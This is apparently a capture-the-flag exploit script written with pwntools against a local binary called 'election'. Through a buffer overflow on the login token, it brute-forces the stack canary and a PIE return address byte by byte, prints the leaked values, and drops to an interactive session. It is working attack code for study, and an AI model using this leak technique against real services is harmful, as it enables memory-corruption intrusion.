#!/usr/bin/env python
from pwn import *

context.arch = 'amd64'

r = process('./election', env={"LD_PRELOAD": "./libc.so"})
pause()

# leak canary and some return address bruteforcely
aaa = 'a' * 0xb8
canary_leaker = []
pie_leaker = []

r.sendlineafter('>', '2')  # register
r.sendthen('Register an anonymous token: ', aaa)

j = 0
while j < 8:
    for i in range(256):
        r.sendlineafter('>', '1')  # login
        r.sendthen('Token: ', aaa + ''.join([chr(x) for x in canary_leaker]) + chr(i))
        if 'Invalid' not in r.recvline():
            canary_leaker.append(i)
            # print("j = {}, leaker = {}".format(j, canary_leaker))
            r.sendlineafter('>', '3')  # logout
            j += 1
            break

j = 0
while j < 8:
    for i in range(256):
        r.sendlineafter('>', '1')  # login
        r.sendthen('Token: ', aaa + ''.join([chr(x) for x in canary_leaker]) + ''.join([chr(x) for x in pie_leaker]) + chr(i))
        if 'Invalid' not in r.recvline():
            pie_leaker.append(i)
            r.sendlineafter('>', '3')  # logout
            j += 1
            break

success("leaked canary: {}".format(hex(u64(''.join([chr(x) for x in canary_leaker])))))
success("leaked <__libc_csu_init>: {}".format(hex(u64(''.join([chr(x) for x in pie_leaker])))))

r.interactive()

0xdcd78baeddd22d00
0xdcd78baeddd22d00
